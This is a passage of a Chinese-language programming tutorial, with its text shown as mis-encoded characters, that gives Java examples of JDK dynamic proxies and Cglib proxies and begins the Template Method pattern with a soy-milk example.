class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDao</span>();<br>      <br>      <span class="hljs-comment">//ç»™ç›®æ ‡å¯¹è±¡ï¼Œåˆ›å»ºä»£ç†å¯¹è±¡, å¯ä»¥è½¬æˆ ITeacherDao</span><br>      <span class="hljs-type">ITeacherDao</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (ITeacherDao)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(target).getProxyInstance();<br>   <br>      <span class="hljs-comment">// proxyInstance=class com.sun.proxy.$Proxy0 å†…å­˜ä¸­åŠ¨æ€ç”Ÿæˆäº†ä»£ç†å¯¹è±¡</span><br>      System.out.println(<span class="hljs-string">&quot;proxyInstance=&quot;</span> + proxyInstance.getClass());<br>      <br>      <span class="hljs-comment">//é€šè¿‡ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•</span><br>      proxyInstance.teach();<br>      <br>      proxyInstance.sayHello(<span class="hljs-string">&quot; tom &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ITeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-comment">//æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span>; <span class="hljs-comment">// æˆè¯¾æ–¹æ³•</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ProxyFactory.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> &#123;<br><br>   <span class="hljs-comment">//ç»´æŠ¤ä¸€ä¸ªç›®æ ‡å¯¹è±¡ , Object</span><br>   <span class="hljs-keyword">private</span> Object target;<br><br>   <span class="hljs-comment">//æ„é€ å™¨ ï¼Œ å¯¹target è¿›è¡Œåˆå§‹åŒ–</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(Object target)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.target = target;<br>   &#125; <br>   <br>   <span class="hljs-comment">//ç»™ç›®æ ‡å¯¹è±¡ ç”Ÿæˆä¸€ä¸ªä»£ç†å¯¹è±¡</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//è¯´æ˜</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">       *  public static Object newProxyInstance(ClassLoader loader,</span><br><span class="hljs-comment">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-comment">                                          InvocationHandler h)</span><br><span class="hljs-comment">                                          </span><br><span class="hljs-comment">            //1. ClassLoader loader ï¼š æŒ‡å®šå½“å‰ç›®æ ‡å¯¹è±¡ä½¿ç”¨çš„ç±»åŠ è½½å™¨, è·å–åŠ è½½å™¨çš„æ–¹æ³•å›ºå®š</span><br><span class="hljs-comment">            //2. Class&lt;?&gt;[] interfaces: ç›®æ ‡å¯¹è±¡å®ç°çš„æ¥å£ç±»å‹ï¼Œä½¿ç”¨æ³›å‹æ–¹æ³•ç¡®è®¤ç±»å‹</span><br><span class="hljs-comment">            //3. InvocationHandler h : äº‹æƒ…å¤„ç†ï¼Œæ‰§è¡Œç›®æ ‡å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œä¼šè§¦å‘äº‹æƒ…å¤„ç†å™¨æ–¹æ³•, ä¼šæŠŠå½“å‰æ‰§è¡Œçš„ç›®æ ‡å¯¹è±¡æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ å…¥</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), <br>            target.getClass().getInterfaces(), <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvocationHandler</span>() &#123;<br>               <br>               <span class="hljs-meta">@Override</span><br>               <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>                  <span class="hljs-comment">// TODO Auto-generated method stub</span><br>                  System.out.println(<span class="hljs-string">&quot;JDKä»£ç†å¼€å§‹~~&quot;</span>);<br>                  <span class="hljs-comment">//åå°„æœºåˆ¶è°ƒç”¨ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•</span><br>                  <span class="hljs-type">Object</span> <span class="hljs-variable">returnVal</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br>                  System.out.println(<span class="hljs-string">&quot;JDKä»£ç†æäº¤&quot;</span>);<br>                  <span class="hljs-keyword">return</span> returnVal;<br>               &#125;<br>            &#125;); <br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; è€å¸ˆæˆè¯¾ä¸­.... &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;hello &quot;</span> + name);<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">proxyInstance=class com.sun.proxy.$Proxy0<br><span class="hljs-keyword">JDKä»£ç†å¼€å§‹~~</span><br><span class="hljs-keyword"></span> è€å¸ˆæˆè¯¾ä¸­.... <br><span class="hljs-keyword">JDKä»£ç†æäº¤</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JDKä»£ç†å¼€å§‹~~</span><br><span class="hljs-keyword"></span>hello  tom <br><span class="hljs-keyword">JDKä»£ç†æäº¤</span><br></code></pre></td></tr></table></figure><h3 id="cglib-ä»£ç†"><a class="markdownIt-Anchor" href="#cglib-ä»£ç†"></a> Cglib ä»£ç†</h3><blockquote><p>Cglib ä»£ç†æ¨¡å¼çš„åŸºæœ¬ä»‹ç»</p></blockquote><ol><li><p>é™æ€ä»£ç†å’Œ JDK ä»£ç†æ¨¡å¼éƒ½è¦æ±‚ç›®æ ‡å¯¹è±¡æ˜¯å®ç°ä¸€ä¸ªæ¥å£,ä½†æ˜¯æœ‰æ—¶å€™ç›®æ ‡å¯¹è±¡åªæ˜¯ä¸€ä¸ª<strong>å•ç‹¬çš„å¯¹è±¡</strong>,å¹¶æ²¡<strong>æœ‰å®****ç°ä»»ä½•çš„æ¥å£</strong>,è¿™ä¸ªæ—¶å€™å¯ä½¿ç”¨ç›®æ ‡å¯¹è±¡å­ç±»æ¥å®ç°ä»£ç†-è¿™å°±æ˜¯ <strong>Cglib ä»£ç†</strong></p></li><li><p>Cglibä»£ç†ä¹Ÿå«ä½œ**å­ç±»ä»£ç†,**å®ƒæ˜¯åœ¨å†…å­˜ä¸­æ„å»ºä¸€ä¸ªå­ç±»å¯¹è±¡ä»è€Œå®ç°å¯¹ç›®æ ‡å¯¹è±¡åŠŸèƒ½æ‰©å±•, æœ‰äº›ä¹¦ä¹Ÿå°†Cglibä»£ç†å½’å±åˆ°åŠ¨æ€ä»£ç†ã€‚</p></li><li><p>Cglib æ˜¯ä¸€ä¸ªå¼ºå¤§çš„é«˜æ€§èƒ½çš„ä»£ç ç”ŸæˆåŒ…,å®ƒå¯ä»¥åœ¨è¿è¡ŒæœŸæ‰©å±• java ç±»ä¸å®ç° java æ¥å£.å®ƒå¹¿æ³›çš„è¢«è®¸å¤š AOP çš„æ¡†æ¶ä½¿ç”¨,ä¾‹å¦‚ Spring AOPï¼Œå®ç°æ–¹æ³•æ‹¦æˆª</p></li><li><p>åœ¨ AOP ç¼–ç¨‹ä¸­å¦‚ä½•é€‰æ‹©ä»£ç†æ¨¡å¼ï¼š</p><ul><li><p>ç›®æ ‡å¯¹è±¡éœ€è¦å®ç°æ¥å£ï¼Œç”¨ JDK ä»£ç†</p></li><li><p>ç›®æ ‡å¯¹è±¡ä¸éœ€è¦å®ç°æ¥å£ï¼Œç”¨ Cglib ä»£ç†</p></li></ul></li><li><p>Cglib åŒ…çš„åº•å±‚æ˜¯é€šè¿‡ä½¿ç”¨å­—èŠ‚ç å¤„ç†æ¡†æ¶ ASM æ¥è½¬æ¢å­—èŠ‚ç å¹¶ç”Ÿæˆæ–°çš„ç±»</p></li></ol><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.cglib;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºç›®æ ‡å¯¹è±¡</span><br>      <span class="hljs-type">TeacherDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDao</span>();<br>      <span class="hljs-comment">//è·å–åˆ°ä»£ç†å¯¹è±¡ï¼Œå¹¶ä¸”å°†ç›®æ ‡å¯¹è±¡ä¼ é€’ç»™ä»£ç†å¯¹è±¡</span><br>      <span class="hljs-type">TeacherDao</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (TeacherDao)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(target).getProxyInstance();<br><br>      <span class="hljs-comment">//æ‰§è¡Œä»£ç†å¯¹è±¡çš„æ–¹æ³•ï¼Œè§¦å‘intecept æ–¹æ³•ï¼Œä»è€Œå®ç° å¯¹ç›®æ ‡å¯¹è±¡çš„è°ƒç”¨</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> proxyInstance.teach();<br>      System.out.println(<span class="hljs-string">&quot;res=&quot;</span> + res);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ProxyFactory.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.cglib;<br><br><br><br><br><span class="hljs-keyword">import</span> net.sf.cglib.proxy.Enhancer;<br><span class="hljs-keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;<br><span class="hljs-keyword">import</span> net.sf.cglib.proxy.MethodProxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> &#123;<br><br>   <span class="hljs-comment">//ç»´æŠ¤ä¸€ä¸ªç›®æ ‡å¯¹è±¡</span><br>   <span class="hljs-keyword">private</span> Object target;<br>   <br>   <span class="hljs-comment">//æ„é€ å™¨ï¼Œä¼ å…¥ä¸€ä¸ªè¢«ä»£ç†çš„å¯¹è±¡</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(Object target)</span> &#123;<br>      <span class="hljs-built_in">this</span>.target = target;<br>   &#125;<br><br>   <span class="hljs-comment">//è¿”å›ä¸€ä¸ªä»£ç†å¯¹è±¡:  æ˜¯ target å¯¹è±¡çš„ä»£ç†å¯¹è±¡</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//1. åˆ›å»ºä¸€ä¸ªå·¥å…·ç±»</span><br>      <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();<br>      <span class="hljs-comment">//2. è®¾ç½®çˆ¶ç±»</span><br>      enhancer.setSuperclass(target.getClass());<br>      <span class="hljs-comment">//3. è®¾ç½®å›è°ƒå‡½æ•°</span><br>      enhancer.setCallback(<span class="hljs-built_in">this</span>);<br>      <span class="hljs-comment">//4. åˆ›å»ºå­ç±»å¯¹è±¡ï¼Œå³ä»£ç†å¯¹è±¡</span><br>      <span class="hljs-keyword">return</span> enhancer.create();<br>      <br>   &#125;<br>   <br><br>   <span class="hljs-comment">//é‡å†™  intercept æ–¹æ³•ï¼Œä¼šè°ƒç”¨ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object arg0, Method method, Object[] args, MethodProxy arg3)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;Cglibä»£ç†æ¨¡å¼ ~~ å¼€å§‹&quot;</span>);<br>      <span class="hljs-type">Object</span> <span class="hljs-variable">returnVal</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br>      System.out.println(<span class="hljs-string">&quot;Cglibä»£ç†æ¨¡å¼ ~~ æäº¤&quot;</span>);<br>      <span class="hljs-keyword">return</span> returnVal;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.cglib;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDao</span> &#123;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; è€å¸ˆæˆè¯¾ä¸­  ï¼Œ æˆ‘æ˜¯cglibä»£ç†ï¼Œä¸éœ€è¦å®ç°æ¥å£ &quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cglibä»£ç†æ¨¡å¼ ~~ å¼€å§‹<br> è€å¸ˆæˆè¯¾ä¸­  ï¼Œ æˆ‘æ˜¯cglibä»£ç†ï¼Œä¸éœ€è¦å®ç°æ¥å£ <br>Cglibä»£ç†æ¨¡å¼ ~~ æäº¤<br><span class="hljs-attribute">res</span>=hello<br></code></pre></td></tr></table></figure><h1 id="æ¨¡æ¿æ¨¡å¼"><a class="markdownIt-Anchor" href="#æ¨¡æ¿æ¨¡å¼"></a> <mark>æ¨¡æ¿æ¨¡å¼</mark></h1><p>åœ¨æ¨¡æ¿æ¨¡å¼ï¼ˆTemplatePatternï¼‰ä¸­ï¼Œä¸€ä¸ªæŠ½è±¡ç±»å…¬å¼€å®šä¹‰äº†æ‰§è¡Œå®ƒçš„æ–¹æ³•çš„æ–¹å¼/æ¨¡æ¿ã€‚å®ƒçš„å­ç±»å¯ä»¥æŒ‰éœ€è¦é‡å†™æ–¹æ³•å®ç°ï¼Œä½†è°ƒç”¨å°†ä»¥æŠ½è±¡ç±»ä¸­å®šä¹‰çš„æ–¹å¼è¿›è¡Œã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-12"><a class="markdownIt-Anchor" href="#ä»‹ç»-12"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•çš„éª¨æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ã€‚æ¨¡æ¿æ–¹æ³•ä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜ä¸€ä¸ªç®—æ³•çš„ç»“æ„å³å¯é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸€äº›æ–¹æ³•é€šç”¨ï¼Œå´åœ¨æ¯ä¸€ä¸ªå­ç±»éƒ½é‡æ–°å†™äº†è¿™ä¸€æ–¹æ³•ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> æœ‰ä¸€äº›é€šç”¨çš„æ–¹æ³•ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å°†è¿™äº›é€šç”¨ç®—æ³•æŠ½è±¡å‡ºæ¥ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> åœ¨æŠ½è±¡ç±»å®ç°ï¼Œå…¶ä»–æ­¥éª¤åœ¨å­ç±»å®ç°ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€åœ¨é€ æˆ¿å­çš„æ—¶å€™ï¼Œåœ°åŸºã€èµ°çº¿ã€æ°´ç®¡éƒ½ä¸€æ ·ï¼Œåªæœ‰åœ¨å»ºç­‘çš„åæœŸæ‰æœ‰åŠ å£æ©±åŠ æ …æ ç­‰å·®å¼‚ã€‚ 2ã€è¥¿æ¸¸è®°é‡Œé¢è©è¨å®šå¥½çš„ 81éš¾ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªé¡¶å±‚çš„é€»è¾‘éª¨æ¶ã€‚ 3ã€spring ä¸­å¯¹ Hibernate çš„æ”¯æŒï¼Œå°†ä¸€äº›å·²ç»å®šå¥½çš„æ–¹æ³•å°è£…èµ·æ¥ï¼Œæ¯”å¦‚å¼€å¯äº‹åŠ¡ã€è·å– Sessionã€å…³é—­Session ç­‰ï¼Œç¨‹åºå‘˜ä¸é‡å¤å†™é‚£äº›å·²ç»è§„èŒƒå¥½çš„ä»£ç ï¼Œç›´æ¥ä¸¢ä¸€ä¸ªå®ä½“å°±å¯ä»¥ä¿å­˜ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€å°è£…ä¸å˜éƒ¨åˆ†ï¼Œæ‰©å±•å¯å˜éƒ¨åˆ†ã€‚ 2ã€æå–å…¬å…±ä»£ç ï¼Œä¾¿äºç»´æŠ¤ã€‚ 3ã€è¡Œä¸ºç”±çˆ¶ç±»æ§åˆ¶ï¼Œå­ç±»å®ç°ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> æ¯ä¸€ä¸ªä¸åŒçš„å®ç°éƒ½éœ€è¦ä¸€ä¸ªå­ç±»æ¥å®ç°ï¼Œå¯¼è‡´ç±»çš„ä¸ªæ•°å¢åŠ ï¼Œä½¿å¾—ç³»ç»Ÿæ›´åŠ åºå¤§ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€æœ‰å¤šä¸ªå­ç±»å…±æœ‰çš„æ–¹æ³•ï¼Œä¸”é€»è¾‘ç›¸åŒã€‚ 2ã€é‡è¦çš„ã€å¤æ‚çš„æ–¹æ³•ï¼Œå¯ä»¥è€ƒè™‘ä½œä¸ºæ¨¡æ¿æ–¹æ³•ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> ä¸ºé˜²æ­¢æ¶æ„æ“ä½œï¼Œä¸€èˆ¬æ¨¡æ¿æ–¹æ³•éƒ½åŠ ä¸Š final å…³é”®è¯ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103150422044.png" alt="image-20230103150422044" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>AbstractClass æŠ½è±¡ç±»ï¼Œ ç±»ä¸­å®ç°äº†æ¨¡æ¿æ–¹æ³•(template)ï¼Œå®šä¹‰äº†ç®—æ³•çš„éª¨æ¶ï¼Œå…·ä½“å­ç±»éœ€è¦å»å®ç° å…¶å®ƒçš„æŠ½è±¡æ–¹æ³• operationr2,3,4</p></li><li><p>ConcreteClass å®ç°æŠ½è±¡æ–¹æ³• operationr2,3,4, ä»¥å®Œæˆç®—æ³•ä¸­ç‰¹ç‚¹å­ç±»çš„æ­¥éª¤</p></li></ol><h2 id="å®ç°-10"><a class="markdownIt-Anchor" href="#å®ç°-10"></a> å®ç°</h2><ol><li>åº”ç”¨å®ä¾‹è¦æ±‚</li></ol><ul><li>ç¼–å†™åˆ¶ä½œè±†æµ†çš„ç¨‹åºï¼Œè¯´æ˜å¦‚ä¸‹:</li><li>åˆ¶ä½œè±†æµ†çš„æµç¨‹ é€‰æâ€”&gt;æ·»åŠ é…æ–™â€”&gt;æµ¸æ³¡â€”&gt;æ”¾åˆ°è±†æµ†æœºæ‰“ç¢</li><li>é€šè¿‡æ·»åŠ ä¸åŒçš„é…æ–™ï¼Œå¯ä»¥åˆ¶ä½œå‡ºä¸åŒå£å‘³çš„è±†æµ†</li><li>é€‰æã€æµ¸æ³¡å’Œæ”¾åˆ°è±†æµ†æœºæ‰“ç¢è¿™å‡ ä¸ªæ­¥éª¤å¯¹äºåˆ¶ä½œæ¯ç§å£å‘³çš„è±†æµ†éƒ½æ˜¯ä¸€æ ·çš„(çº¢è±†ã€èŠ±ç”Ÿè±†æµ†ã€‚ã€‚ã€‚)</li></ul><ol start="2"><li>æ€è·¯åˆ†æå’Œå›¾è§£(ç±»å›¾)</li></ol><h3 id="æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä¸€"><a class="markdownIt-Anchor" href="#æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä¸€"></a> æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä¸€</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103151032471.png" alt="image-20230103151032471" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ¶ä½œçº¢è±†è±†æµ†</span><br>      <br>      System.out.println(<span class="hljs-string">&quot;----åˆ¶ä½œçº¢è±†è±†æµ†----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">redBeanSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedBeanSoyaMilk</span>();<br>      redBeanSoyaMilk.make();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----åˆ¶ä½œèŠ±ç”Ÿè±†æµ†----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">peanutSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PeanutSoyaMilk</span>();<br>      peanutSoyaMilk.make();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PeanutSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PeanutSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span 